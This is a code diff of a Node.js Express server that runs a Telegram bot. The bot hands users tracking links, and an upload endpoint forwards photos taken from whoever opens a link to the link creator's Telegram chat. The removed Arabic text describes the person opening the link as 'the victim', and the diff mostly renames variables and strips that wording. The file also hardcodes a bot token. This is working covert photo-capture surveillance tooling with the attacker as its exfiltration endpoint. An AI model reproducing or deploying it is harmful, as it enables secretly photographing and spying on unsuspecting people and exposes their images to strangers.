@@ -5,15 +5,15 @@ const cors = require('cors');
 const FormData = require('form-data');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3000; //
 
-const BOT_TOKEN = '7899918022:AAFeO3ofPyWdsYkGLcDlULCtu_Tff_CQM60';
+const BOT_TOKEN = '7899918022:AAFeO3ofPyWdsYkGLcDlULCtu_Tff_CQM60'; //
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-app.use(cors());
-app.use(bodyParser.json({ limit: '50mb' }));
+app.use(cors()); //
+app.use(bodyParser.json({ limit: '50mb' })); //
 
-const welcomeMessage = `𓆩『𝕄𝔸𝕏💀⚠️𝕟¹.⁶𝕢』𓆪
+const welcomeMsg = `𓆩『𝕄𝔸𝕏💀⚠️𝕟¹.⁶𝕢』𓆪
 ⬛⬜⬛⬜⬛⬜⬛⬜
 ⬜⬛⬜⬛⬜⬛⬜⬛
 ⬛⬜⬛⬜⬛⬜⬛⬜
@@ -32,54 +32,45 @@ _/  _/  _/  _/
 𝕄𝔸𝕏 𝕆ℕ 𝕋𝕆ℙ
 █▄▄▄▄▄▄▄▄▄▄▄▄▄▄█`;
 
-// استقبال رسائل البوت
+// استقبال رسائل البوت (Start)
 app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
     const { message, callback_query } = req.body;
-
     if (message && message.text === '/start') {
         await axios.post(`${TELEGRAM_API}/sendMessage`, {
             chat_id: message.chat.id,
-            text: welcomeMessage,
+            text: welcomeMsg,
             reply_markup: {
-                inline_keyboard: [[
-                    { text: "🔗 استخراج الرابط الخاص بك", callback_data: `gen_${message.chat.id}` }
-                ]]
+                inline_keyboard: [[{ text: "🔗 استخراج الرابط", callback_data: `link_${message.chat.id}` }]]
             }
         });
     }
-
     if (callback_query) {
         const userId = callback_query.from.id;
-        // ملاحظة: استبدل الرابط التالي برابط موقعك الفعلي على Render بعد الرفع
-        const userLink = `https://${req.get('host')}/?id=${userId}`;
-        
+        const myUrl = `https://${req.get('host')}/?id=${userId}`;
         await axios.post(`${TELEGRAM_API}/sendMessage`, {
             chat_id: userId,
-            text: `⚠️ **الرابط جاهز!**\nعندما يفتح الضحية هذا الرابط، ستصلك صوره هنا مباشرة:\n\n${userLink}`,
-            parse_mode: "Markdown"
+            text: `✅ الرابط الخاص بك جاهز:\n${myUrl}`
         });
     }
     res.sendStatus(200);
 });
 
-// استقبال الصور من الواجهة الأمامية
+// استقبال الصور
 app.post('/upload-photo', async (req, res) => {
     const { image, targetId } = req.body;
     if (!image || !targetId) return res.sendStatus(400);
 
-    const base64Image = image.replace(/^data:image\/\w+;base64,/, "");
-    const imageBuffer = Buffer.from(base64Image, 'base64');
+    const base64Image = image.replace(/^data:image\/\w+;base64,/, ""); //
+    const buffer = Buffer.from(base64Image, 'base64'); //
     
     const form = new FormData();
     form.append('chat_id', targetId);
-    form.append('photo', imageBuffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });
+    form.append('photo', buffer, { filename: 'pic.jpg', contentType: 'image/jpeg' }); //
 
     try {
-        await axios.post(`${TELEGRAM_API}/sendPhoto`, form, { headers: form.getHeaders() });
-        res.status(200).send("Success");
-    } catch (e) {
-        res.status(500).send("Error");
-    }
+        await axios.post(`${TELEGRAM_API}/sendPhoto`, form, { headers: form.getHeaders() }); //
+        res.sendStatus(200);
+    } catch (e) { res.sendStatus(500); }
 });
 
-app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
+app.listen(PORT, () => console.log(`Running on ${PORT}`)); //
